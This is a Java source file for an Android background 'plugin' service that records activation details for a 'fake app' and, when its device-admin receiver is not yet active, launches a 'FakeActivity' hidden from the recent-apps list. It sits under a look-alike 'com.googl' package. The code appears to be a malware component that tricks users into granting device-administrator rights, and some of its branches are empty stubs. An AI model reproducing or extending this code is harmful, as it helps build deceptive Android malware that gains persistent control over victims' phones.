package com.xstd.plugin.service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import com.googl.plugin.x.FakeActivity;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:53
 * To change this template use File | Settings | File Templates.
 */
public class PluginService extends IntentService {

    public static final String ACTIVE_ACTION = "com.xstd.plugin.active";

    public static final String PORT_FETCH_ACTION = "com.xstd.plugin.port";

    public static final String ACTIVE_PACKAGE_ACTION = "com.xstd.plugin.package.active";

    public PluginService() {
        super("PluginService");
    }

    @Override
    public void onHandleIntent(Intent intent) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTIVE_ACTION.equals(action)) {
                //do active

                //after active success
                SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
            } else if (PORT_FETCH_ACTION.equals(action)) {
                //do fetch port

                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && pm.isScreenOn()) {
                    //do fetch request
                }
            } else if (ACTIVE_PACKAGE_ACTION.equals(action)) {
                /**
                 * 其实什么也不需要做，这个action主要就是激活一下plugin程序
                 * 这条消息是由主程序发出的，如果主程序不激活子程序的话，子程序是不能接受到所有的BRC的
                 */
                Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PACKAGE_ACTION + " <<<<");
                try {
                    SettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
                    SettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));

                    Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
                                    + " packageName = " + intent.getStringExtra("packageName")
                                    + " >>>>>>>>>>>");

                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                    boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class));

                    if (!isActive && !AppRuntime.FAKE_WINDOW_SHOW) {
                        Intent i = new Intent();
                        i.setClass(this.getApplicationContext(), FakeActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(i);
                    }
                } catch (Exception e) {
                }
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

}
